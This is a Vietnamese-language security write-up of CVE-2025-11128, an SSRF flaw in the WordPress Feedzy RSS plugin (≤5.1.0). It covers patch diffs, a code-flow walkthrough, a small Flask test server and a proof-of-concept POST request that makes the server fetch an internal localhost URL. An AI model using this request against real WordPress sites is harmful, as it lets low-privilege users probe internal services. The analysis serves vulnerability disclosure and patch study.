---
title: CVE-2025-11128 Analysis & POC
description: Security Vulnerability in WordPress Feedzy Plugin.
date: 2025-10-30 19:00:00 +0700
categories: [CVE Analyst]
tags: [analyst, plugin, ssrf]
images: ["app.png"]
featuredImage: "app.png"

lightgallery: true

toc:
  auto: false
---

<!--more-->

## CVE & Basic Info
Plugin RSS Aggregator của Feedzy – Feed to Post, Autoblogging, News & YouTube Video Feeds Aggregator cho WordPress bị lỗ hổng **Server-Side Request Forgery** trong tất cả các phiên bản đến và bao gồm `5.1.0` thông qua hàm `'feedzy_sanitize_feeds'`. Điều này cho phép kẻ tấn công đã xác thực, với quyền truy cập ở mức **Subscriber** trở lên, thực hiện các yêu cầu web tới các địa chỉ tùy ý xuất phát từ ứng dụng web và có thể được sử dụng để truy vấn thông tin từ các dịch vụ nội bộ.

* **CVE ID**: [CVE-2025-11128](https://www.cve.org/CVERecord?id=CVE-2025-11128)
* **Vulnerability Type**: Server Side Request Forgery (SSRF)
* **Affected Versions**: <= 5.1.0
* **Patched Versions**: 5.1.1
* **CVSS severity**: Low (5)
* **Required Privilege**: Subscriber
* **Product**: [WordPress Feedzy Plugin](https://wordpress.org/plugins/feedzy-rss-feeds/advanced/)

## Requirements
* **Local WordPress & Debugging**: [Local WordPress and Debugging](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/).
* **Plugin versions** - **Feedzy**: **5.1.0** (vulnerable) và **5.1.1** (patched).
* **Diff tool** - [**Meld**](https://meldmerge.org/) hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản.

## Analysis

Plugin **Feedzy RSS Aggregator** đã đăng ký một REST API endpoint tại `/feedzy/v1/feed/`, cho phép người dùng gửi URL để lấy dữ liệu feed.  
Tuy nhiên, trong **phiên bản 5.1.0**, endpoint này được bảo vệ lỏng lẻo và cơ chế lọc URL không an toàn, dẫn đến **lỗ hổng SSRF (Server-Side Request Forgery)**.

### Patch diff

```php {title="feedzy-rss-feeds-gutenberg-block.php - v5.1.0" hl_lines=[8,9,10,13,23,25,30]}
public function feedzy_register_rest_route() {
    register_rest_route(
        'feedzy/v1',
        '/feed/',
        array(
            'methods'             => 'POST',
            'callback'            => array( $this, 'feedzy_rest_route' ),
            'permission_callback' => function () {
                return is_user_logged_in();
            },
            'args'                => array(
                'url'      => array(
                    'sanitize_callback' => array( $this, 'feedzy_sanitize_feeds' ),
                ),
                'category' => array(
                    'sanitize_callback' => array( $this, 'feedzy_sanitize_categories' ),
                ),
            ),
        )
    );
}

public function feedzy_sanitize_feeds( $input ) {
    if ( count( $input ) === 1 ) {
        $feed = esc_url( $input[0] );
        return $feed;
    } else {
        $feeds = array();
        foreach ( $input as $item ) {
            $feeds[] = esc_url( $item );
        }
        return $feeds;
    }
}
```

Trong phiên bản lỗi:
* Endpoint chỉ kiểm tra `is_user_logged_in()`, tức là bất kỳ tài khoản đã đăng nhập nào (kể cả Subscriber) đều có thể gửi request.
* Hàm `feedzy_sanitize_feeds()` chỉ sử dụng `esc_url()` - hàm này chỉ làm sạch chuỗi URL để hiển thị, không xác thực tính hợp lệ hay giới hạn truy cập nội bộ.

{{< admonition bug >}}
Do đó, attacker có thể gửi payload `url=http://localhost:8001/admin` để ép server gửi request đến dịch vụ nội bộ → SSRF.
{{< /admonition >}}

```php {title="feedzy-rss-feeds-gutenberg-block.php - v5.1.1" hl_lines=[8,9,10,11,14,24,26,31,32]}
public function feedzy_register_rest_route() {
    register_rest_route(
        'feedzy/v1',
        '/feed/',
        array(
            'methods'             => 'POST',
            'callback'            => array( $this, 'feedzy_rest_route' ),
            'permission_callback' => function ( WP_REST_Request $request ) {
                $post_id = absint( $request->get_param( 'postId' ) );
                return current_user_can( 'edit_post', $post_id );
            },
            'args'                => array(
                'url'      => array(
                    'sanitize_callback' => array( $this, 'feedzy_sanitize_feeds' ),
                ),
                'category' => array(
                    'sanitize_callback' => array( $this, 'feedzy_sanitize_categories' ),
                ),
            ),
        )
    );
}

public function feedzy_sanitize_feeds( $input ) {
    if ( count( $input ) === 1 ) {
        $feed = wp_http_validate_url( $input[0] );
        return $feed;
    } else {
        $feeds = array();
        foreach ( $input as $item ) {
            if ( wp_http_validate_url( $item ) ) {
                $feeds[] = esc_url_raw( $item );
            }
        }
        return $feeds;
    }
}
```
Bản vá đã:
* Giới hạn quyền truy cập REST API bằng `current_user_can( 'edit_post', $post_id )`, chỉ cho phép **Editor** hoặc **Admin** có quyền gọi endpoint.
* Thay thế `esc_url()` bằng `wp_http_validate_url()`, đảm bảo URL hợp lệ, chỉ chấp nhận giao thức **http**/**https**, và loại bỏ địa chỉ nội bộ (`loopback`, `localhost`, `127.0.0.1...`).
* Sử dụng `esc_url_raw()` để lưu URL an toàn mà không tự động mã hóa lại.

{{< admonition info >}}
Hàm `count()` trong `feedzy_sanitize_feeds()` yêu cầu tham số đầu vào phải thuộc kiểu **Countable** hoặc **array**. Nếu truyền vào một **string**, PHP sẽ ném lỗi:

{{< admonition bug >}}
**Exception has occurred.**
TypeError: count(): Argument #1 ($value) must be of type Countable|array, string given
{{< /admonition >}}

Vì vậy, khi gửi request đến endpoint, cần truyền tham số `url` dưới dạng **mảng**, ví dụ:
`url[0]="http://example.com"`
{{< /admonition >}}

### Vulnerable Code 

`feedzy_rest_route()` được đăng ký làm callback cho API trên:

```php {title="feedzy-rss-feeds-gutenberg-block.php - v5.1.1" hl_lines=[27]}
public function feedzy_rest_route( $data ) {
    $feed = $data;
    if ( isset( $data['feeds'] ) ) {
        $feed_category = $this->feedzy_sanitize_categories( $data['feeds'] );
        if ( $feed_category ) {
            $data['url'] = $feed_category;
        }
    }
    if ( ! empty( $data['url'] ) ) {
        $feed = $data['url'];
    } elseif ( ! empty( $data['category'] ) ) {
        $feed = $data['category'];
    }

    $url = '';
    if ( ! $feed instanceof \WP_REST_Request ) {
        $url = $feed;
    }

    $meta_args = array(
        'date_format' => get_option( 'date_format' ),
        'time_format' => get_option( 'time_format' ),
    );

    $instance = Feedzy_Rss_Feeds::instance();
    $admin    = $instance->get_admin();
    $feed     = $admin->fetch_feed( $url, '12_hours', array( '' ) );
    $feedy    = array();

    if ( ! $feed->init() ) {
        $feedy['error'] = __( 'Invalid Feed URL', 'feedzy-rss-feeds' );
        header( 'Content-Type: application/json; charset=' . get_option( 'blog_charset' ) );
        return $feedy;
    }

    if ( ( ! $feed->get_title() ) && ( ! $feed->get_title() ) && ( ! $feed->get_title() ) ) {
        $feedy['channel'] = null;
    } else {
        $feedy['channel'] = array(
            'title'       => ( ( $feed->get_title() ) ? $feed->get_title() : null ),
            'description' => ( ( $feed->get_description() ) ? $feed->get_description() : null ),
            'permalink'   => ( ( $feed->get_permalink() ) ? $feed->get_permalink() : null ),
        );
    }

    $feedy['items'] = array();
    $items          = $feed->get_items();
    $is_multiple    = ! empty( $feed->multifeed_url ) && is_array( $feed->multifeed_url );
    foreach ( $items as $item ) {
        $item_attrs = apply_filters( 'feedzy_item_filter', array(), $item );

        array_push(
            $feedy['items'],
            array(
                'title'       => ( ( $item->get_title() ) ? $item->get_title() : null ),
                'link'        => ( ( $item->get_permalink() ) ? $item->get_permalink() : null ),
                'creator'     => ( ( $item->get_author() ) ? $item->get_author()->get_name() : null ),
                'source'      => $is_multiple && $item->get_feed()->get_title() ? $item->get_feed()->get_title() : '',
                'pubDate'     => ( ( $item->get_date() ) ? $item->get_date( 'U' ) : null ),
                'date'        => ( ( $item->get_date() ) ? date_i18n( $meta_args['date_format'], $item->get_date( 'U' ) ) : null ),
                'time'        => ( ( $item->get_date() ) ? date_i18n( $meta_args['time_format'], $item->get_date( 'U' ) ) : null ),
                'description' => isset( $item_attrs['item_description'] ) ? $item_attrs['item_description'] : ( $item->get_description() ? $item->get_description() : null ),
                'thumbnail'   => $admin->feedzy_retrieve_image( $item ),
                'default_img' => apply_filters( 'feedzy_default_image', '', $url ),
                'price'       => isset( $item_attrs['item_price'] ) ? $item_attrs['item_price'] : null,
                'media'       => isset( $item_attrs['item_media'] ) ? $item_attrs['item_media'] : null,
                'categories'  => isset( $item_attrs['item_categories'] ) ? $item_attrs['item_categories'] : null,
            )
        );
    }

    header( 'Content-Type: application/json; charset=' . get_option( 'blog_charset' ) );
    $output = $feedy;
    return $output;
}
```

Logic của hàm:

1. Nhận và xử lý dữ liệu đầu vào

```php
$feed = $data;
if ( isset( $data['feeds'] ) ) {
    $feed_category = $this->feedzy_sanitize_categories( $data['feeds'] );
    if ( $feed_category ) {
        $data['url'] = $feed_category;
    }
}
```

* Hàm kiểm tra nếu request có chứa tham số `feeds`, nó sẽ được **làm sạch** (sanitize) qua `feedzy_sanitize_categories()`
* Nếu hợp lệ, kết quả được gán lại cho `$data['url']`.

2. Ưu tiên chọn nguồn dữ liệu `$feed`

```php
if ( ! empty( $data['url'] ) ) {
    $feed = $data['url'];
} elseif ( ! empty( $data['category'] ) ) {
    $feed = $data['category'];
}
```

* Nếu có `url` → dùng làm nguồn chính.
* Nếu không có `url` → dùng `category`.

→ Đây là nơi đầu vào người dùng (`url`) được chuyển tiếp sang quá trình fetch feed.

3. Chuẩn bị biến `$url`

```php
$url = '';
if ( ! $feed instanceof \WP_REST_Request ) {
    $url = $feed;
}
```

* Nếu `$feed` **không phải là đối tượng WP_REST_Request**, nó được gán cho `$url`.
* Thực tế `$feed` thường là **một chuỗi URL hoặc mảng URL** được lấy từ request.

4. Gọi đến core function xử lý

```php
$instance = Feedzy_Rss_Feeds::instance();
$admin    = $instance->get_admin();
$feed     = $admin->fetch_feed( $url, '12_hours', array( '' ) );
```

* Gọi `Feedzy_Rss_Feeds::instance()` để lấy instance chính của plugin.
* Dùng `$admin->fetch_feed()` để **tải feed từ URL** (với thời gian cache 12 giờ).

  > ⚠️ Đây chính là nơi có thể xảy ra SSRF nếu `$url` đến từ input không kiểm soát.

5. Kiểm tra lỗi tải RSS

```php
if ( ! $feed->init() ) {
    $feedy['error'] = __( 'Invalid Feed URL', 'feedzy-rss-feeds' );
    return $feedy;
}
```

* Nếu `init()` thất bại → trả về lỗi JSON `"Invalid Feed URL"`.

6. Trích xuất thông tin kênh (channel)

```php
if ( ( ! $feed->get_title() ) && ... ) {
    $feedy['channel'] = null;
} else {
    $feedy['channel'] = array(
        'title' => $feed->get_title(),
        'description' => $feed->get_description(),
        'permalink' => $feed->get_permalink(),
    );
}
```

* Nếu feed không có tiêu đề → gán `null`.
* Ngược lại → tạo thông tin channel chuẩn (title, description, link).

7. Lặp qua từng item trong feed

```php
foreach ( $items as $item ) {
    $item_attrs = apply_filters( 'feedzy_item_filter', array(), $item );
    array_push(
        $feedy['items'],
        array(
            'title'       => ( ( $item->get_title() ) ? $item->get_title() : null ),
            'link'        => ( ( $item->get_permalink() ) ? $item->get_permalink() : null ),
            'creator'     => ( ( $item->get_author() ) ? $item->get_author()->get_name() : null ),
            'source'      => $is_multiple && $item->get_feed()->get_title() ? $item->get_feed()->get_title() : '',
            'pubDate'     => ( ( $item->get_date() ) ? $item->get_date( 'U' ) : null ),
            'date'        => ( ( $item->get_date() ) ? date_i18n( $meta_args['date_format'], $item->get_date( 'U' ) ) : null ),
            'time'        => ( ( $item->get_date() ) ? date_i18n( $meta_args['time_format'], $item->get_date( 'U' ) ) : null ),
            'description' => isset( $item_attrs['item_description'] ) ? $item_attrs['item_description'] : ( $item->get_description() ? $item->get_description() : null ),
            'thumbnail'   => $admin->feedzy_retrieve_image( $item ),
            'default_img' => apply_filters( 'feedzy_default_image', '', $url ),
            'price'       => isset( $item_attrs['item_price'] ) ? $item_attrs['item_price'] : null,
            'media'       => isset( $item_attrs['item_media'] ) ? $item_attrs['item_media'] : null,
            'categories'  => isset( $item_attrs['item_categories'] ) ? $item_attrs['item_categories'] : null,
        )
    );
}
```

8. Trả kết quả JSON

```php
header( 'Content-Type: application/json; charset=' . get_option( 'blog_charset' ) );
return $feedy;
```

* Mỗi bài viết (item) được lấy ra và ánh xạ thành mảng JSON có: Tiêu đề, liên kết, tác giả, ngày, mô tả, ảnh thumbnail, v.v.

{{< admonition >}}
Nội dung được trả về chứa các trường chỉ định => Cho thấy dữ liệu fetch từ URL là một file có cấu trúc bao gồm các trường ở trên nên ta không thể đọc một file bất kỳ được.
{{< /admonition >}}

Ta phân tích `fetch_feed()` để xem file nó thực sự đọc được là gì:

```php {title="feedzy-rss-feeds-admin-abstract.php - v5.1.0" hl_lines=[4,33,52]}
public function fetch_feed( $feed_url, $cache = '12_hours', $sc = '' ) {
    // Load SimplePie if not already.
    do_action( 'feedzy_pre_http_setup', $feed_url );
    if ( function_exists( 'feedzy_amazon_get_locale_hosts' ) ) {
        $amazon_hosts     = feedzy_amazon_get_locale_hosts();
        $is_amazon_source = false;
        if ( is_array( $feed_url ) ) {
            $url_host         = array_map(
                function ( $url ) {
                    return 'webservices.' . wp_parse_url( $url, PHP_URL_HOST );
                },
                $feed_url
            );
            $url_host         = array_diff( $url_host, $amazon_hosts );
            $is_amazon_source = ! empty( $amazon_hosts ) && empty( $url_host );
        } else {
            $url_host         = 'webservices.' . wp_parse_url( $feed_url, PHP_URL_HOST );
            $is_amazon_source = ! empty( $amazon_hosts ) && in_array( $url_host, $amazon_hosts, true );
        }
        if ( $is_amazon_source ) {
            $feed = $this->init_amazon_api(
                $feed_url,
                isset( $sc['refresh'] ) ? $sc['refresh'] : '12_hours',
                array(
                    'number_of_item' => isset( $sc['max'] ) ? $sc['max'] : 5,
                    'no-cache'       => false,
                )
            );
            return $feed;
        }
    }
    // Load SimplePie Instance.
    $feed = $this->init_feed( $feed_url, $cache, $sc ); // Not used as log as #41304 is Opened.

    // Report error when is an error loading the feed.
    if ( is_wp_error( $feed ) ) {
        // Fallback for different edge cases.
        if ( is_array( $feed_url ) ) {
            $feed_url = array_map( 'html_entity_decode', $feed_url );
        } else {
            $feed_url = html_entity_decode( $feed_url );
        }

        $feed_url = $this->get_valid_source_urls( $feed_url, $cache );

        $feed = $this->init_feed( $feed_url, $cache, $sc ); // Not used as log as #41304 is Opened.

    }

    do_action( 'feedzy_post_http_teardown', $feed_url );

    return $feed;
}
```

Nếu `feedzy_amazon_get_locale_hosts` có tồn tại thì thực hiện logic trong `if` và trả về `$feed`

```php
if ( function_exists( 'feedzy_amazon_get_locale_hosts' ) ) {
    ...
    return $feed
}
```

Khi tìm kiếm hàm `feedzy_amazon_get_locale_hosts` trong toàn bộ thư mục của plugin, ta nhận thấy hàm này **không được khai báo hoặc định nghĩa ở bất kỳ đâu**.
Do đó, điều kiện kiểm tra `if ( function_exists( 'feedzy_amazon_get_locale_hosts' ) )` sẽ luôn **trả về `false`**, khiến luồng thực thi **bỏ qua nhánh đó** và **tiếp tục gọi hàm `init_feed()`** sau đó **check error** và trả về feed.

![Function](function.png "Kết quả tìm kiếm feedzy_amazon_get_locale_hosts")

```php {title="feedzy-rss-feeds-admin-abstract.php - v5.1.0" hl_lines=[3,5,18,31,34]}
private function init_feed( $feed_url, $cache, $sc, $allow_https = FEEDZY_ALLOW_HTTPS ) {
    ...
    $feed = new Feedzy_Rss_Feeds_Util_SimplePie( $sc );
    $feed->set_file_class( 'WP_SimplePie_File' );
    $default_agent = $this->get_default_user_agent( $feed_url );
    $feed->set_useragent( apply_filters( 'http_headers_useragent', $default_agent ) );
   

    // Do not use force_feed for multiple URLs.
    $feed->force_feed( apply_filters( 'feedzy_force_feed', ( is_string( $feed_url ) || ( is_array( $feed_url ) && 1 === count( $feed_url ) ) ) ) );

    do_action( 'feedzy_modify_feed_config', $feed );

    $cloned_feed = clone $feed;

    // set the url as the last step, because we need to be able to clone this feed without the url being set
    // so that we can fall back to raw data in case of an error.
    $feed->set_feed_url( $feed_url );

    // Allow unsafe html.
    if ( defined( 'FEEDZY_ALLOW_UNSAFE_HTML' ) && FEEDZY_ALLOW_UNSAFE_HTML ) {
        $feed->strip_htmltags( false );
    }

    if ( isset( $_SERVER['HTTP_USER_AGENT'] ) ) {
        // phpcs:ignore WordPressVIPMinimum.Variables.RestrictedVariables.cache_constraints___SERVER__HTTP_USER_AGENT__
        $set_server_agent = sanitize_text_field( wp_unslash( $_SERVER['HTTP_USER_AGENT'] ) . SIMPLEPIE_USERAGENT );
        $feed->set_useragent( apply_filters( 'http_headers_useragent', $set_server_agent ) );
    }

    $feed->init();

    ...
    return $feed;
}
```

Hàm `init_feed()` chịu trách nhiệm khởi tạo và cấu hình đối tượng **SimplePie**, setup một số thông tin cơ bản và gọi đến `$feed->init()` để gửi request.

```php {title="SimplePie.php - v5.1.0" hl_lines=[29,43,44,45,46,47,48,49,50]}
public function init() {
    // Check absolute bare minimum requirements.
    if (!extension_loaded('xml') || !extension_loaded('pcre')) {
        $this->error = 'XML or PCRE extensions not loaded!';
        return false;
    }
    // Then check the xml extension is sane (i.e., libxml 2.7.x issue on PHP < 5.2.9 and libxml 2.7.0 to 2.7.2 on any version) if we don't have xmlreader.
    elseif (!extension_loaded('xmlreader')) {
        static $xml_is_sane = null;
        if ($xml_is_sane === null) {
            $parser_check = xml_parser_create();
            xml_parse_into_struct($parser_check, '<foo>&amp;</foo>', $values);
            xml_parser_free($parser_check);
            $xml_is_sane = isset($values[0]['value']);
        }
        if (!$xml_is_sane) {
            return false;
        }
    }
    ...
    if ($this->feed_url === null && $this->raw_data === null) {
        return false;
    }

    $cache = false;
    if ($this->enable_cache) {
        $cache = $this->get_cache($this->feed_url);
    }
    if (($fetched = $this->fetch_data($cache)) === true) {
        return true;
    } elseif ($fetched === false) {
        return false;
    }

    [$headers, $sniffed] = $fetched;

    if (empty($this->raw_data)) {
        $this->error = "Empty response from `$this->feed_url`";
        return false;
    }

    // Parse
    foreach ($this->get_possible_encodings($headers, $sniffed) as $encoding) {
        $utf8_data = $this->convert_to_utf8($this->raw_data, $encoding);
        $parser = $this->registry->create(Parser::class);
        if ($parser->parse($utf8_data, 'UTF-8', $this->permanent_url)) {
            $this->data = $parser->get_data();
            return true;
        }
    }

    return false;
}
```

=> Ta thấy file được yêu cầu ở đâu là dạng XML

```php
$this->fetch_data($cache)
```

Đây là nơi thực hiện HTTP request đến URL mà người dùng gửi lên.

### Flow

{{< mermaid >}}
graph TD
    A["User input via /feedzy/v1/feed (REST API)"] --> B["feedzy_sanitize_feeds()"]
    B --> C["esc_url() → no internal host validation"]
    C --> D["feedzy_rest_route()"]
    D --> E["Feedzy_Rss_Feeds::instance()"]
    E --> F["$admin->fetch_feed(url)"]
    F --> G{"feedzy_amazon_get_locale_hosts() exists?"}
    G -- No --> H["init_feed()"]
    H --> I["Feedzy_Rss_Feeds_Util_SimplePie::init()"]
    I --> J["fetch_data(cache)"]
    J --> K["HTTP request to user-controlled URL → SSRF"]
{{< /mermaid >}}

## Exploit

### Local Server
Tạo local service đơn giản bằng python

```py
from flask import Flask, request, send_from_directory, Response
import os

BASE_DIR = os.path.abspath(os.getcwd())
app = Flask(__name__)

@app.route('/delete', methods=['GET'])
def delete():
    file_id = request.args.get('id')
    if not file_id:
        return "No id provided", 400
    print(f"delete it: {file_id}")
    return f"Delete it: {file_id}"

@app.route('/metadata')
def metadata():
    return send_from_directory(BASE_DIR, 'metadata.json', as_attachment=True)

@app.route('/feed', methods=['GET'])
def feed():
    xml_content = """<?xml version="1.0" encoding="UTF-8"?>
    <rss version="2.0">
      <channel>
        <title>Example Feed</title>
        <link>https://example.com</link>
        <description>This is a sample RSS feed generated by Flask.</description>
        <item>
          <title>First item</title>
          <link>https://example.com/item1</link>
          <description>Hello world!</description>
        </item>
        <item>
          <title>Second item</title>
          <link>https://example.com/item2</link>
          <description>Another entry.</description>
        </item>
      </channel>
    </rss>"""
    
    return Response(xml_content, mimetype='application/xml')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8001, debug=True)
```

### Proof of Concept (PoC)

1. Login bằng tài khoản Contributor
2. Gửi POST request với URL trỏ đến local service:

```php
POST /wp-json/feedzy/v1/feed HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://localhost/wp-login.php?redirect_to=http%3A%2F%2Flocalhost%2Fwp-admin%2F&reauth=1
Connection: keep-alive
Cookie: wordpress_86a9106ae65537651a8e456835b316ab=sub%7C1761790291%7C0Q8NLwANiN0Uz0cgmvSAN6iBfEFzSylzkAkZn4kLcoG%7Cdf597bffe4c239d9e871b2ac98a2d427df0fb82dc7a09099bc026fbbff641ad1; wp-settings-time-2=1761542750; _lscache_vary=0f9122a3a07756eeee3b4199f2c151b1; wp-settings-time-3=1761591693; wp-settings-3=mfold%3Do; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=sub%7C1761790291%7C0Q8NLwANiN0Uz0cgmvSAN6iBfEFzSylzkAkZn4kLcoG%7Cd42e05305965ebb0efad0d1374e9552219c641afb6452531634d3b4e414c6a48; wp_lang=en_US

url[0]=http://localhost:8001/feed&category=cat
```

**Result**:

![Result](result.png "Nội dung đọc được từ local service")

{{< admonition >}}
Nếu thử `url` với file không phải dạng XML, ta nhận được response:

![Metadata](metadata.png "Kết quả khi file không thuộc dạng XML")
{{< /admonition >}}

## Conclusion

Lỗ hổng **CVE-2025-11128** trong plugin **Feedzy RSS Aggregator** xuất phát từ việc xử lý URL không an toàn trong REST API `/feedzy/v1/feed`.
Hàm `feedzy_sanitize_feeds()` chỉ dùng `esc_url()` mà không xác minh địa chỉ, cho phép attacker có quyền **Subscriber** gửi yêu cầu SSRF đến các dịch vụ nội bộ.

Bản vá **5.1.1** khắc phục bằng cách sử dụng `wp_http_validate_url()`, thắt chặt quyền truy cập API qua `current_user_can('edit_post', $post_id)` và thay `esc_url()` bằng `esc_url_raw()`.

## Key takeaways

* `esc_url()` không đủ để xác minh URL đầu vào.
* REST API cần được giới hạn quyền truy cập phù hợp.
* Cần xác minh và lọc URL để ngăn SSRF đến mạng nội bộ.

## References

[SSRF (Server Side Request Forgery) — Hacktrick](https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html)

[ WordPress Feedzy Plugin <= 5.1.0 is vulnerable to Server Side Request Forgery (SSRF) ](https://patchstack.com/database/wordpress/plugin/feedzy-rss-feeds/vulnerability/wordpress-feedzy-rss-feeds-lite-plugin-5-1-0-authenticated-subscriber-server-side-request-forgery-vulnerability) 